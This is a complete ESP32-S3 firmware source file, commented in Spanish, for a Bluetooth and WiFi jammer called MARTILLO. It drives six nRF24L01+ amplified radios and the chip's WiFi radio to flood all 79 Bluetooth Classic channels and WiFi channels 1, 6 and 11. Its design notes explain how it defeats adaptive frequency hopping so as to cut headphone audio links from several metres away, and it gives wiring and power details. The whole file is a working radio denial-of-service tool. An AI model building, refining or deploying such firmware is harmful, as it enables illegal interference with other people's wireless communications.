/*
 * MARTILLO v10.0 — ESP32-S3 N16R8 — ESP-IDF 6.0.3
 * 6x nRF24L01+ PA/LNA (carpa GFSK) + radio WiFi del S3 (bloque 802.11 de 20 MHz)
 *
 * SPI2 (SCK 12, MOSI 11, MISO 13): NRF1(CE 4 CS 10) NRF2(CE 5 CS 9) NRF3(CE 6 CS 14)
 * SPI3 (SCK 18, MOSI 8,  MISO 7):  NRF4(CE 1 CS 21) NRF5(CE 15 CS 16) NRF6(CE 17 CS 38)
 * WS2812 -> GPIO 48
 *
 * ===== POR QUE ESTE DISEÑO =====
 * Objetivo: A2DP contra audifonos caros a varios metros. El enemigo no es el
 * hop rate de 1600/s, es AFH: remapea en ~1 s y excluye lo que oye sucio.
 * BT Core 5.4 Vol 2 Part B 4.5 exige >=20 canales buenos. Debajo de eso AFH
 * se queda sin mapa y el enlace no se sostiene.
 *
 * 6 x nRF24 a 2 Mbps GFSK = 12 MHz de 79. Solo, no alcanza. Por eso:
 *   - 6 radios en carpa: 13-14 canales por radio, dwell 450us con jitter,
 *     orden barajado, payload LFSR, TX_REUSE. ~100% de duty, 0 ventanas de
 *     silencio, 0 escaneo.
 *   - Radio WiFi del S3: tramas beacon 802.11 crudas de ~168 B a 1 Mbps
 *     (preamble largo) sobre 20 MHz. Rota 1 -> 6 -> 11 cada 150 ms para que
 *     AFH no pueda asentar un mapa estable.
 *
 * ===== POR QUE 2 Mbps Y NO CW =====
 * 2 Mbps GFSK ocupa ~2 MHz y el preamble del nRF24 es 0x55 alternado, igual
 * que el preamble de BT BR. Al demodulador del audifono le llega algo que
 * PARECE trama valida: se pone a correlacionar el access code y falla. Un CW
 * es un tono de decenas de kHz, filtrable, y encima obliga a dwell largo.
 *
 * ===== LIMITES FISICOS ASUMIDOS =====
 * - PLL lock 130us (Nordic PS Tabla 16): dwell 450us da 71% de portadora
 *   estable, el resto es chirp de relock (que tambien jamea, es broadband).
 * - RFX2401C: 120-170 mA de pico por modulo. AMS1117 por modulo, 470uF de
 *   bulk, 10uF+100nF en el header. Nunca del regulador del devkit.
 * - GPIO 35/36/37 son PSRAM octal: no se tocan.
 * - Antenas >=7 cm de separacion, polarizacion alternada.
 */

#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/spi_master.h"
#include "driver/gpio.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "soc/spi_struct.h"
#include "led_strip.h"

#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "esp_wifi.h"

static const char *TAG = "MART";

/* ===================== CONFIG ===================== */
#define CH_LO            2
#define CH_HI            80
#define NUM_CANALES      (CH_HI - CH_LO + 1)     /* 79, BT Classic 2402-2480 */
#define NUM_RADIOS       6

#define DWELL_US         450u     /* > 130us de PLL; ~2.7 tramas de 168us */
#define JITTER_US        150u     /* rompe el peine, AFH no predice */

#define REFRESCO_HOPS    96u      /* recarga de payload pseudoaleatorio */

#define CON_WIFI         1        /* radio WiFi del S3 como 3er TX */
#define WIFI_MS_POR_CANAL 150     /* rotacion 1 -> 6 -> 11 */
#define WIFI_FRAMES_POR_TICK 1

#define SPI_HZ           (16 * 1000 * 1000)
#define CPU_MHZ          240u
#define CEDE_MS          2000

/* ===================== tiempo / RNG ===================== */
static inline __attribute__((always_inline)) uint32_t cyc(void) {
    uint32_t c; __asm__ __volatile__("rsr.ccount %0" : "=a"(c)); return c;
}
static uint32_t g_rng = 0x9E3779B9u;
static inline IRAM_ATTR uint32_t rnd(void) {
    uint32_t x = g_rng;
    x ^= x << 13; x ^= x >> 17; x ^= x << 5;
    return g_rng = x;
}

/* ===================== LED ===================== */
#define LED_GPIO GPIO_NUM_48
#define LED_B   40
static led_strip_handle_t led;
static void led_set(uint8_t r, uint8_t g, uint8_t b) {
    led_strip_set_pixel(led, 0, r, g, b);
    led_strip_refresh(led);
}

/* ===================== nRF24 ===================== */
#define NRF_CONFIG      0x00
#define NRF_EN_AA       0x01
#define NRF_EN_RXADDR   0x02
#define NRF_SETUP_AW    0x03
#define NRF_SETUP_RETR  0x04
#define NRF_RF_CH       0x05
#define NRF_RF_SETUP    0x06
#define NRF_STATUS      0x07
#define NRF_RPD         0x09
#define NRF_TX_ADDR     0x10
#define NRF_FIFO_STATUS 0x17

#define CMD_R_REGISTER   0x00
#define CMD_W_REGISTER   0x20
#define CMD_W_TX_PAYLOAD 0xA0
#define CMD_FLUSH_TX     0xE1

/* 0x0F = RF_DR_HIGH (2 Mbps) | RF_PWR 11 (0 dBm). OJO: 0x0E = -6 dBm. */
#define RF_SETUP_STORM   0x0F
#define RF_SETUP_CW      (0x0F | (1u<<7) | (1u<<4))
#define CONFIG_TX        0x72   /* PWR_UP, PRIM_RX=0, sin CRC, IRQ enmascaradas */
#define CONFIG_RX        0x73
#define TX_REUSE         (1u<<6)

typedef struct {
    const char *nombre;
    spi_host_device_t host;
    gpio_num_t ce, cs, sck, mosi, miso;
    bool cs_alto;
    spi_device_handle_t spi;
    spi_dev_t *hw;
    uint8_t  seq[24];
    uint8_t  len, idx;
    volatile uint32_t hops;
    bool bang_ok, bang_sucio, vivo;
} radio_t;

static radio_t radios[NUM_RADIOS] = {
    { .nombre="NRF1", .host=SPI2_HOST, .ce=GPIO_NUM_4,  .cs=GPIO_NUM_10,
      .sck=GPIO_NUM_12, .mosi=GPIO_NUM_11, .miso=GPIO_NUM_13 },
    { .nombre="NRF2", .host=SPI2_HOST, .ce=GPIO_NUM_5,  .cs=GPIO_NUM_9,
      .sck=GPIO_NUM_12, .mosi=GPIO_NUM_11, .miso=GPIO_NUM_13 },
    { .nombre="NRF3", .host=SPI2_HOST, .ce=GPIO_NUM_6,  .cs=GPIO_NUM_14,
      .sck=GPIO_NUM_12, .mosi=GPIO_NUM_11, .miso=GPIO_NUM_13 },
    { .nombre="NRF4", .host=SPI3_HOST, .ce=GPIO_NUM_1,  .cs=GPIO_NUM_21,
      .sck=GPIO_NUM_18, .mosi=GPIO_NUM_8,  .miso=GPIO_NUM_7  },
    { .nombre="NRF5", .host=SPI3_HOST, .ce=GPIO_NUM_15, .cs=GPIO_NUM_16,
      .sck=GPIO_NUM_18, .mosi=GPIO_NUM_8,  .miso=GPIO_NUM_7  },
    { .nombre="NRF6", .host=SPI3_HOST, .ce=GPIO_NUM_17, .cs=GPIO_NUM_38,
      .sck=GPIO_NUM_18, .mosi=GPIO_NUM_8,  .miso=GPIO_NUM_7  },
};

static volatile int g_vivos = 0;

/* GPIO 0..31 -> W1TS/W1TC ; 32..48 -> OUT1_* */
#define GPIO_OUT_W1TS  (*(volatile uint32_t *)0x60004008u)
#define GPIO_OUT_W1TC  (*(volatile uint32_t *)0x6000400Cu)
#define GPIO_OUT1_W1TS (*(volatile uint32_t *)0x60004014u)
#define GPIO_OUT1_W1TC (*(volatile uint32_t *)0x60004018u)

static inline void ce_hi(radio_t *r) {
    if ((uint32_t)r->ce >= 32) GPIO_OUT1_W1TS = 1u << ((uint32_t)r->ce - 32);
    else                       GPIO_OUT_W1TS  = 1u << (uint32_t)r->ce;
}
static inline void ce_lo(radio_t *r) {
    if ((uint32_t)r->ce >= 32) GPIO_OUT1_W1TC = 1u << ((uint32_t)r->ce - 32);
    else                       GPIO_OUT_W1TC  = 1u << (uint32_t)r->ce;
}
static inline void cs_lo(radio_t *r) {
    if (r->cs_alto) GPIO_OUT1_W1TC = 1u << ((uint32_t)r->cs - 32);
    else            GPIO_OUT_W1TC  = 1u << (uint32_t)r->cs;
}
static inline void cs_hi(radio_t *r) {
    if (r->cs_alto) GPIO_OUT1_W1TS = 1u << ((uint32_t)r->cs - 32);
    else            GPIO_OUT_W1TS  = 1u << (uint32_t)r->cs;
}

/* ===================== SPI bang ===================== */
static inline spi_dev_t *spi_hw(spi_host_device_t h) {
    return (h == SPI2_HOST) ? &GPSPI2 : &GPSPI3;
}
static uint8_t g_bang_align = 0;
#define BANG_W(c,v) (g_bang_align == 0 ? (((uint32_t)(c)<<24)|((uint32_t)(v)<<16)) : \
                    g_bang_align == 1 ? (((uint32_t)(c)<<8)|(uint32_t)(v))         : \
                                        (((uint32_t)(c))|((uint32_t)(v)<<8)))

static void IRAM_ATTR bang_arm(radio_t *r) {
    spi_dev_t *hw = r->hw;
    hw->user.usr_mosi = 1; hw->user.usr_miso = 0;
    hw->user.usr_addr = 0; hw->user.usr_command = 0; hw->user.usr_dummy = 0;
    hw->dma_conf.dma_tx_ena = 0; hw->dma_conf.dma_rx_ena = 0;
    hw->ms_dlen.ms_data_bitlen = 15;
}
static void marcar_sucio(spi_host_device_t h) {
    for (int i = 0; i < NUM_RADIOS; i++)
        if (radios[i].vivo && radios[i].host == h) radios[i].bang_sucio = true;
}
static inline IRAM_ATTR void bang_write(radio_t *r, uint8_t cmd, uint8_t val) {
    if (r->bang_sucio) { bang_arm(r); r->bang_sucio = false; }
    spi_dev_t *hw = r->hw;
    cs_lo(r);
    hw->data_buf[0] = BANG_W(cmd, val);
    hw->cmd.usr = 1;
    uint32_t g = 100000;
    while (hw->cmd.usr && --g) { }
    cs_hi(r);
}

/* ===================== SPI driver ===================== */
static void nrf_write_reg(radio_t *r, uint8_t reg, uint8_t v) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA, .length = 16 };
    t.tx_data[0] = CMD_W_REGISTER | reg; t.tx_data[1] = v;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
}
static uint8_t nrf_read_reg(radio_t *r, uint8_t reg) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA | SPI_TRANS_USE_RXDATA, .length = 16 };
    t.tx_data[0] = CMD_R_REGISTER | reg; t.tx_data[1] = 0xFF;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
    return t.rx_data[1];
}
static void nrf_cmd(radio_t *r, uint8_t c) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA, .length = 8 };
    t.tx_data[0] = c;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
}
static void nrf_write_multi(radio_t *r, uint8_t reg, const uint8_t *b, int n) {
    uint8_t tx[8]; tx[0] = CMD_W_REGISTER | reg;
    for (int i = 0; i < n; i++) tx[1+i] = b[i];
    spi_transaction_t t = { .length = (size_t)((n+1)*8), .tx_buffer = tx };
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
}
static void nrf_payload(radio_t *r, const uint8_t *b, int n) {
    uint8_t tx[33]; tx[0] = CMD_W_TX_PAYLOAD;
    memcpy(&tx[1], b, (size_t)n);
    spi_transaction_t t = { .length = (size_t)((n+1)*8), .tx_buffer = tx };
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    marcar_sucio(r->host);
}

/* ===================== init radios ===================== */
static void bus_init(spi_host_device_t h, gpio_num_t sck, gpio_num_t mosi, gpio_num_t miso) {
    spi_bus_config_t b = {
        .mosi_io_num = mosi, .miso_io_num = miso, .sclk_io_num = sck,
        .quadwp_io_num = -1, .quadhd_io_num = -1, .max_transfer_sz = 64,
    };
    ESP_ERROR_CHECK(spi_bus_initialize(h, &b, SPI_DMA_DISABLED));
}

static void park_all_pins(void) {
    for (int i = 0; i < NUM_RADIOS; i++) {
        radio_t *r = &radios[i];
        r->cs_alto = ((uint32_t)r->cs >= 32);
        gpio_reset_pin(r->ce); gpio_set_direction(r->ce, GPIO_MODE_OUTPUT);
        gpio_set_level(r->ce, 0);
        gpio_reset_pin(r->cs); gpio_set_direction(r->cs, GPIO_MODE_OUTPUT);
        gpio_set_level(r->cs, 1);
        r->hw = spi_hw(r->host);
    }
}

static bool radio_add(radio_t *r) {
    spi_device_interface_config_t dc = {
        .clock_speed_hz = SPI_HZ, .mode = 0, .spics_io_num = -1, .queue_size = 1,
    };
    if (spi_bus_add_device(r->host, &dc, &r->spi) != ESP_OK) return false;
    nrf_write_reg(r, NRF_RF_CH, 0x5A);
    return nrf_read_reg(r, NRF_RF_CH) == 0x5A;
}

static bool radio_init(radio_t *r) {
    ce_lo(r); cs_hi(r); r->hw = spi_hw(r->host);
    bool ok = false;
    for (int i = 0; i < 5 && !ok; i++) {
        if (i) vTaskDelay(pdMS_TO_TICKS(100));
        if (radio_add(r)) { ok = true; break; }
        if (r->spi) { spi_bus_remove_device(r->spi); r->spi = NULL; }
    }
    if (!ok) { r->spi = NULL; return false; }
    nrf_write_reg(r, NRF_STATUS, 0x70);
    nrf_cmd(r, CMD_FLUSH_TX);
    return true;
}

static void payload_fresco(radio_t *r) {
    uint8_t b[32];
    for (int i = 0; i < 32; i++) b[i] = (uint8_t)rnd();
    ce_lo(r);
    nrf_cmd(r, CMD_FLUSH_TX);
    nrf_payload(r, b, 32);
    nrf_write_reg(r, NRF_FIFO_STATUS, TX_REUSE);
    ce_hi(r);
}

static void storm_enter(radio_t *r) {
    /* direccion de 5 B: junto con el preamble 0x55 imita la estructura de
     * access code de BT BR lo suficiente para que el demod intente y falle */
    const uint8_t dir[5] = {0xA7, 0x3C, 0x91, 0x5E, 0xD2};
    ce_lo(r);
    nrf_cmd(r, CMD_FLUSH_TX);
    nrf_write_reg(r, NRF_EN_AA, 0x00);
    nrf_write_reg(r, NRF_EN_RXADDR, 0x00);
    nrf_write_reg(r, NRF_SETUP_AW, 0x03);
    nrf_write_reg(r, NRF_SETUP_RETR, 0x00);
    nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_STORM);
    nrf_write_multi(r, NRF_TX_ADDR, dir, 5);
    nrf_write_reg(r, NRF_CONFIG, CONFIG_TX);
    payload_fresco(r);
}

static void bang_detectar(radio_t *r) {
    for (int a = 0; a < 3; a++) {
        g_bang_align = (uint8_t)a;
        r->hw = spi_hw(r->host);
        bang_write(r, CMD_W_REGISTER | NRF_RF_CH, 0x2A);
        if (nrf_read_reg(r, NRF_RF_CH) == 0x2A) { r->bang_ok = true; return; }
    }
    r->bang_ok = false;
}

/* ===================== reparto ===================== */
static void repartir(void) {
    int vivos[NUM_RADIOS], nv = 0;
    for (int i = 0; i < NUM_RADIOS; i++) if (radios[i].vivo) vivos[nv++] = i;
    if (!nv) return;

    for (int i = 0; i < NUM_RADIOS; i++) radios[i].len = 0;

    int k = 0;
    for (int c = CH_LO; c <= CH_HI; c++) {
        radio_t *r = &radios[vivos[k % nv]];
        if (r->len < sizeof(r->seq)) r->seq[r->len++] = (uint8_t)c;
        k++;
    }
    /* Fisher-Yates: orden barajado, nada de rampa monotona */
    for (int i = 0; i < nv; i++) {
        radio_t *r = &radios[vivos[i]];
        for (int j = r->len - 1; j > 0; j--) {
            int q = (int)(rnd() % (uint32_t)(j + 1));
            uint8_t t = r->seq[j]; r->seq[j] = r->seq[q]; r->seq[q] = t;
        }
    }
    ESP_LOGI(TAG, "Reparto: %d canales en %d radios", NUM_CANALES, nv);
}

/* ===================== hop ===================== */
static inline IRAM_ATTR void hop(radio_t *r) {
    if (!r->vivo || !r->len) return;
    r->idx++;
    if (r->idx >= r->len) r->idx = 0;
    uint8_t ch = r->seq[r->idx];
    if (r->bang_ok) bang_write(r, CMD_W_REGISTER | NRF_RF_CH, ch);
    else            nrf_write_reg(r, NRF_RF_CH, ch);
    r->hops++;
    if (!(r->hops % REFRESCO_HOPS)) payload_fresco(r);
}

static inline IRAM_ATTR uint32_t dwell_jit(void) {
    int32_t j = (int32_t)(rnd() % (2u * JITTER_US + 1u)) - (int32_t)JITTER_US;
    int32_t d = (int32_t)DWELL_US + j;
    if (d < 220) d = 220;
    return (uint32_t)d * CPU_MHZ;
}

/* ===================== WiFi ===================== */
#if CON_WIFI
static const uint8_t WIFI_CANALES[] = {1, 6, 11};
static uint8_t beacon[200];
static int beacon_len = 0;

static void beacon_build(void) {
    static const uint8_t mac[6] = {0x02, 0x4A, 0x41, 0x4D, 0x00, 0x01};
    uint8_t *p = beacon;
    *p++ = 0x80; *p++ = 0x00;              /* FC: beacon */
    *p++ = 0x00; *p++ = 0x00;              /* duration */
    for (int i = 0; i < 6; i++) *p++ = 0xFF;   /* DA broadcast */
    for (int i = 0; i < 6; i++) *p++ = mac[i]; /* SA */
    for (int i = 0; i < 6; i++) *p++ = mac[i]; /* BSSID */
    *p++ = 0x00; *p++ = 0x00;              /* seq (la reescribe el driver) */
    for (int i = 0; i < 8; i++) *p++ = 0x00;   /* timestamp */
    *p++ = 0x64; *p++ = 0x00;              /* interval 100 TU */
    *p++ = 0x31; *p++ = 0x04;              /* capability */
    *p++ = 0x00; *p++ = 0x20;              /* SSID IE, 32 B */
    for (int i = 0; i < 32; i++) *p++ = (uint8_t)('A' + (i % 26));
    *p++ = 0xDD; *p++ = 0x60;              /* vendor IE 96 B: mas airtime */
    *p++ = 0x00; *p++ = 0x50; *p++ = 0xF2;
    for (int i = 0; i < 0x5D; i++) *p++ = (uint8_t)rnd();
    beacon_len = (int)(p - beacon);
}

static bool wifi_arrancar(void) {
    esp_err_t e = nvs_flash_init();
    if (e == ESP_ERR_NVS_NO_FREE_PAGES || e == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        e = nvs_flash_init();
    }
    if (e != ESP_OK) return false;

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (esp_wifi_init(&cfg) != ESP_OK) return false;
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_start();
    esp_wifi_set_ps(WIFI_PS_NONE);          /* sin ahorro: no queremos latencia */
    esp_wifi_set_max_tx_power(84);          /* 84 * 0.25 dBm = 21 dBm */
    esp_wifi_set_channel(WIFI_CANALES[0], WIFI_SECOND_CHAN_NONE);

    beacon_build();
    ESP_LOGI(TAG, "WiFi TX listo: beacon %d B, rotando 1/6/11 cada %d ms",
             beacon_len, WIFI_MS_POR_CANAL);
    return true;
}

static void IRAM_ATTR wifi_task(void *arg) {
    int idx = 0;
    int64_t t_canal = esp_timer_get_time();
    for (;;) {
        if (esp_timer_get_time() - t_canal >= (int64_t)WIFI_MS_POR_CANAL * 1000) {
            t_canal = esp_timer_get_time();
            idx = (idx + 1) % 3;
            esp_wifi_set_channel(WIFI_CANALES[idx], WIFI_SECOND_CHAN_NONE);
        }
        for (int i = 0; i < WIFI_FRAMES_POR_TICK; i++)
            esp_wifi_80211_tx(WIFI_IF_STA, beacon, beacon_len, true);
        vTaskDelay(1);                      /* el driver hace backpressure solo */
    }
}
#endif

/* ===================== tasks jam ===================== */
static void IRAM_ATTR jam_a(void *arg) {      /* core 1: radios 0-2 */
    int64_t t = esp_timer_get_time();
    for (;;) {
        uint32_t c0 = cyc();
        hop(&radios[0]); hop(&radios[1]); hop(&radios[2]);
        uint32_t d = dwell_jit();
        while (cyc() - c0 < d) { }
        int64_t n = esp_timer_get_time();
        if (n - t >= (int64_t)CEDE_MS * 1000) { t = n; vTaskDelay(1); }
    }
}
static void IRAM_ATTR jam_b(void *arg) {      /* core 0: radios 3-5 */
    int64_t t = esp_timer_get_time();
    for (;;) {
        uint32_t c0 = cyc();
        hop(&radios[3]); hop(&radios[4]); hop(&radios[5]);
        uint32_t d = dwell_jit();
        while (cyc() - c0 < d) { }
        int64_t n = esp_timer_get_time();
        if (n - t >= (int64_t)CEDE_MS * 1000) { t = n; vTaskDelay(1); }
    }
}

/* ===================== monitor ===================== */
static void monitor(void *arg) {
    uint32_t prev[NUM_RADIOS] = {0};
    int64_t tp = esp_timer_get_time();
    for (;;) {
        vTaskDelay(pdMS_TO_TICKS(2000));
        int64_t n = esp_timer_get_time();
        uint32_t sum = 0;
        for (int i = 0; i < NUM_RADIOS; i++) {
            if (!radios[i].vivo) continue;
            sum += radios[i].hops - prev[i];
            prev[i] = radios[i].hops;
        }
        uint32_t hz = (uint32_t)((uint64_t)sum * 1000000ull / (uint64_t)(n - tp));
        tp = n;
        ESP_LOGI(TAG, "vivos=%d hops/s=%lu (%.1f/radio) revisita=%.2f ms",
                 g_vivos, (unsigned long)hz,
                 g_vivos ? (double)hz / g_vivos : 0.0,
                 hz ? 1000.0 * g_vivos / (double)hz : 0.0);
        led_set(0, LED_B, 0); vTaskDelay(pdMS_TO_TICKS(20)); led_set(0, 0, 0);
    }
}

/* ===================== arranque ===================== */
void app_main(void) {
    led_strip_config_t sc = {
        .strip_gpio_num = LED_GPIO, .max_leds = 1,
        .led_model = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
    };
    led_strip_rmt_config_t rc = {
        .clk_src = RMT_CLK_SRC_DEFAULT, .resolution_hz = 10 * 1000 * 1000,
        .flags = { .with_dma = 0 },
    };
    ESP_ERROR_CHECK(led_strip_new_rmt_device(&sc, &rc, &led));
    led_set(40, 40, 0);

    park_all_pins();
    bus_init(SPI2_HOST, GPIO_NUM_12, GPIO_NUM_11, GPIO_NUM_13);
    bus_init(SPI3_HOST, GPIO_NUM_18, GPIO_NUM_8,  GPIO_NUM_7);

    int act = 0;
    for (int i = 0; i < NUM_RADIOS; i++) {
        radios[i].vivo = radio_init(&radios[i]);
        if (radios[i].vivo) act++;
        else ESP_LOGE(TAG, "%s MUERTO", radios[i].nombre);
    }
    if (!act) {
        ESP_LOGE(TAG, "NINGUN NRF");
        for (;;) { led_set(60, 0, 0); vTaskDelay(pdMS_TO_TICKS(200)); }
    }
    g_vivos = act;

    for (int i = 0; i < NUM_RADIOS; i++) {
        if (!radios[i].vivo) continue;
        storm_enter(&radios[i]);
        bang_detectar(&radios[i]);
        radios[i].bang_sucio = true;
    }
    repartir();

#if CON_WIFI
    bool wifi_ok = wifi_arrancar();
#else
    bool wifi_ok = false;
#endif

    led_set(0, 40, 0);
    ESP_LOGI(TAG, "MARTILLO v10.0 · %d/6 nRF · dwell=%u+/-%u · WiFi=%s · RF_SETUP=0x%02X",
             act, (unsigned)DWELL_US, (unsigned)JITTER_US,
             wifi_ok ? "ON (20MHz rotando)" : "OFF", RF_SETUP_STORM);

    xTaskCreatePinnedToCore(jam_a, "ja", 4096, NULL, configMAX_PRIORITIES - 3, NULL, 1);
    xTaskCreatePinnedToCore(jam_b, "jb", 4096, NULL, configMAX_PRIORITIES - 3, NULL, 0);
#if CON_WIFI
    if (wifi_ok)
        xTaskCreatePinnedToCore(wifi_task, "wf", 4096, NULL, configMAX_PRIORITIES - 2, NULL, 0);
#endif
    xTaskCreatePinnedToCore(monitor, "mon", 3072, NULL, 1, NULL, 0);

    vTaskDelay(portMAX_DELAY);
}
